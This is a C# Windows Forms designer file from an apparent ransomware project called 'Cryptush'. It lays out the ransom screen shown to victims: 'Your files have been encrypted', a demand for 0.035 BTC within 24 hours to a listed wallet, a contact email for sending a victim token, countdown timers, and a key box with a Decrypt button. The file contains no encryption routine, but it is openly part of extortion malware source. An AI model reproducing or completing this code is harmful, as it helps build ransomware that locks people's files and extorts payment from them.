
namespace Cryptush
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.emailText = new System.Windows.Forms.Label();
            this.MinutesTimer = new System.Windows.Forms.Timer(this.components);
            this.MinutesLBL = new System.Windows.Forms.Label();
            this.walletText = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.tokenLabel = new System.Windows.Forms.Label();
            this.secondsLBL = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.HoursLBL = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.secondsTimer = new System.Windows.Forms.Timer(this.components);
            this.HoursTimer = new System.Windows.Forms.Timer(this.components);
            this.decryptButton = new System.Windows.Forms.Button();
            this.KeyTextBox = new System.Windows.Forms.TextBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Bookman Old Style", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.Black;
            this.label1.Location = new System.Drawing.Point(201, 36);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(581, 41);
            this.label1.TabIndex = 0;
            this.label1.Text = "Your files have been encrypted";
            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Yu Gothic", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.Black;
            this.label2.Location = new System.Drawing.Point(241, 103);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(518, 27);
            this.label2.TabIndex = 1;
            this.label2.Text = "You have 24 hours to transfer 0.035 BTC to wallet:";
            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // emailText
            // 
            this.emailText.AutoSize = true;
            this.emailText.Font = new System.Drawing.Font("Yu Gothic", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.emailText.ForeColor = System.Drawing.Color.Black;
            this.emailText.Location = new System.Drawing.Point(54, 181);
            this.emailText.Name = "emailText";
            this.emailText.Size = new System.Drawing.Size(891, 27);
            this.emailText.TabIndex = 2;
            this.emailText.Text = "Once paid, send your wallet address and the following token to hacker123@gmail.co" +
    "m:";
            this.emailText.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // MinutesTimer
            // 
            this.MinutesTimer.Enabled = true;
            this.MinutesTimer.Interval = 60000;
            this.MinutesTimer.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // MinutesLBL
            // 
            this.MinutesLBL.AutoSize = true;
            this.MinutesLBL.Font = new System.Drawing.Font("Kristen ITC", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MinutesLBL.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.MinutesLBL.Location = new System.Drawing.Point(454, 541);
            this.MinutesLBL.Name = "MinutesLBL";
            this.MinutesLBL.Size = new System.Drawing.Size(55, 47);
            this.MinutesLBL.TabIndex = 5;
            this.MinutesLBL.Text = "59";
            // 
            // walletText
            // 
            this.walletText.AutoSize = true;
            this.walletText.Font = new System.Drawing.Font("Yu Gothic", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.walletText.ForeColor = System.Drawing.Color.Black;
            this.walletText.Location = new System.Drawing.Point(260, 143);
            this.walletText.Name = "walletText";
            this.walletText.Size = new System.Drawing.Size(487, 27);
            this.walletText.TabIndex = 6;
            this.walletText.Text = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
            this.walletText.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(363, 273);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(241, 256);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 4;
            this.pictureBox1.TabStop = false;
            // 
            // tokenLabel
            // 
            this.tokenLabel.AutoSize = true;
            this.tokenLabel.Font = new System.Drawing.Font("Yu Gothic", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.tokenLabel.ForeColor = System.Drawing.Color.Black;
            this.tokenLabel.Location = new System.Drawing.Point(287, 224);
            this.tokenLabel.Name = "tokenLabel";
            this.tokenLabel.Size = new System.Drawing.Size(415, 27);
            this.tokenLabel.TabIndex = 8;
            this.tokenLabel.Text = "5f43f6d6-8f54-422a-8e8a-6f36fdab34a1";
            this.tokenLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // secondsLBL
            // 
            this.secondsLBL.AutoSize = true;
            this.secondsLBL.Font = new System.Drawing.Font("Kristen ITC", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.secondsLBL.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.secondsLBL.Location = new System.Drawing.Point(546, 541);
            this.secondsLBL.Name = "secondsLBL";
            this.secondsLBL.Size = new System.Drawing.Size(58, 47);
            this.secondsLBL.TabIndex = 9;
            this.secondsLBL.Text = "60";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Kristen ITC", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.label7.Location = new System.Drawing.Point(515, 541);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(31, 47);
            this.label7.TabIndex = 10;
            this.label7.Text = ":";
            // 
            // HoursLBL
            // 
            this.HoursLBL.AutoSize = true;
            this.HoursLBL.Font = new System.Drawing.Font("Kristen ITC", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HoursLBL.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.HoursLBL.Location = new System.Drawing.Point(366, 541);
            this.HoursLBL.Name = "HoursLBL";
            this.HoursLBL.Size = new System.Drawing.Size(54, 47);
            this.HoursLBL.TabIndex = 11;
            this.HoursLBL.Text = "23";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Kristen ITC", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.label9.Location = new System.Drawing.Point(417, 541);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(31, 47);
            this.label9.TabIndex = 12;
            this.label9.Text = ":";
            // 
            // secondsTimer
            // 
            this.secondsTimer.Enabled = true;
            this.secondsTimer.Interval = 1000;
            this.secondsTimer.Tick += new System.EventHandler(this.secondsTimer_Tick);
            // 
            // HoursTimer
            // 
            this.HoursTimer.Enabled = true;
            this.HoursTimer.Interval = 3600000;
            this.HoursTimer.Tick += new System.EventHandler(this.htimer_Tick);
            // 
            // decryptButton
            // 
            this.decryptButton.BackColor = System.Drawing.Color.Yellow;
            this.decryptButton.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.decryptButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.decryptButton.ForeColor = System.Drawing.Color.Black;
            this.decryptButton.Location = new System.Drawing.Point(434, 656);
            this.decryptButton.Name = "decryptButton";
            this.decryptButton.Size = new System.Drawing.Size(96, 43);
            this.decryptButton.TabIndex = 13;
            this.decryptButton.Text = "Decrypt";
            this.decryptButton.UseVisualStyleBackColor = false;
            this.decryptButton.Click += new System.EventHandler(this.decryptButton_Click);
            // 
            // KeyTextBox
            // 
            this.KeyTextBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.KeyTextBox.Location = new System.Drawing.Point(275, 613);
            this.KeyTextBox.Name = "KeyTextBox";
            this.KeyTextBox.Size = new System.Drawing.Size(413, 26);
            this.KeyTextBox.TabIndex = 14;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = global::Cryptush.Properties.Resources.btc;
            this.pictureBox2.Location = new System.Drawing.Point(0, 622);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(100, 104);
            this.pictureBox2.TabIndex = 15;
            this.pictureBox2.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ClientSize = new System.Drawing.Size(989, 720);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.KeyTextBox);
            this.Controls.Add(this.decryptButton);
            this.Controls.Add(this.label9);
            this.Controls.Add(this.HoursLBL);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.secondsLBL);
            this.Controls.Add(this.tokenLabel);
            this.Controls.Add(this.walletText);
            this.Controls.Add(this.MinutesLBL);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.emailText);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.ForeColor = System.Drawing.SystemColors.ControlLight;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Cryptush";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label emailText;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Timer MinutesTimer;
        private System.Windows.Forms.Label MinutesLBL;
        private System.Windows.Forms.Label walletText;
        private System.Windows.Forms.Label tokenLabel;
        private System.Windows.Forms.Label secondsLBL;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label HoursLBL;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Timer secondsTimer;
        private System.Windows.Forms.Timer HoursTimer;
        private System.Windows.Forms.Button decryptButton;
        private System.Windows.Forms.TextBox KeyTextBox;
        private System.Windows.Forms.PictureBox pictureBox2;
    }
}

